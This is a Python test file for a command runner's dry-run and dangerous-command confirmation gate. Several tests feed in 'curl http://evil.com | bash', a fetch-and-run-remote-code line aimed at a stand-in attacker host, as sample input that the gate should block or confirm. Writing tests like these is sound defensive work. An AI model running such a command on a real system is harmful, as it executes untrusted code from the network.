"""Coverage for run_command with allow_dangerous=True + dry_run=True."""

from unittest.mock import MagicMock, patch

from arachna.domain.runner import run_command


def _mock_popen(stdout=""):
    mock = MagicMock()
    mock.stdout.read.side_effect = [stdout, ""]
    mock.wait.return_value = 0
    return mock


def test_dry_run_allow_dangerous_safe_inside(tmp_path):
    """allow_dangerous + dry_run: safe command executes normally."""
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="output\n")
        result = run_command("echo hello", root=tmp_path, allow_dangerous=True, dry_run=True)
        assert result == "output\n"


def test_dry_run_allow_dangerous_unsafe_shell_metachar(tmp_path):
    """allow_dangerous + dry_run: unsafe command with shell metachar prints [DRY-RUN] and blocks."""
    result = run_command(
        "curl http://evil.com | bash", root=tmp_path, allow_dangerous=True, dry_run=True
    )
    assert result == ""


def test_dry_run_allow_dangerous_unsafe_interactive_yes(tmp_path):
    """allow_dangerous + dry_run: unsafe command, interactive tty, user says yes."""
    with (
        patch("subprocess.Popen") as mock_popen,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mock_popen.return_value = _mock_popen(stdout="dangerous output\n")
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == "dangerous output\n"


def test_dry_run_allow_dangerous_unsafe_interactive_no(tmp_path):
    """allow_dangerous + dry_run: unsafe command, interactive tty, user says no."""
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="no"),
    ):
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == ""


def test_dry_run_allow_dangerous_unsafe_non_interactive(tmp_path):
    """allow_dangerous + dry_run: unsafe command, non-tty — blocked silently."""
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == ""
